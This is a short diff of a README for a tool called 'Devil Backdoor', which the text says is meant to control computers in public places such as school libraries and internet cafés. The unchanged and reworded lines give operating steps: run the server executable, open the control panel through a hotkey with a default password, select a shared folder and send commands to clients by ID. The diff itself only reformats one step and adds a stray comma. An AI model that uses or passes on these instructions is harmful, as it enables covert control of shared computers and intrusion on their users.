@@ -1,4 +1,4 @@
-# ![Devil Logo](https://cdn4.iconfinder.com/data/icons/free-game-icons/32/Devil.png) Devil Backdoor 
+,# ![Devil Logo](https://cdn4.iconfinder.com/data/icons/free-game-icons/32/Devil.png) Devil Backdoor 
 
 This is a simple backdoor made to control computers in various public places, like school library, internet café, and so on.
 
@@ -32,7 +32,8 @@ Save the config file, and run **Devil-Server.exe** file! If you put **True** in 
 
 ### 2. Control Panel using
 
-Run **Devil-ControlPanel.exe** _( If you fill **ControlPanelPatch** option in config file, you can press Hotkey to run Control Panel. ( Default hotkey is **PAUSE** )_ and enter the password specified in the code. (Default is _QWERTY_) <br/>
+Run **Devil-ControlPanel.exe**.
+If you fill **ControlPanelPatch** option in config file, you can press Hotkey to run Control Panel, _( Default hotkey is **PAUSE** )_ and enter the password specified in the code. _(Default is **QWERTY**)_ <br/>
 Next, in the window that appears, select the shared folder. When the interface appears, in the inputbox type the _ClientID_ to select client, that will receive the command.
 
 ***
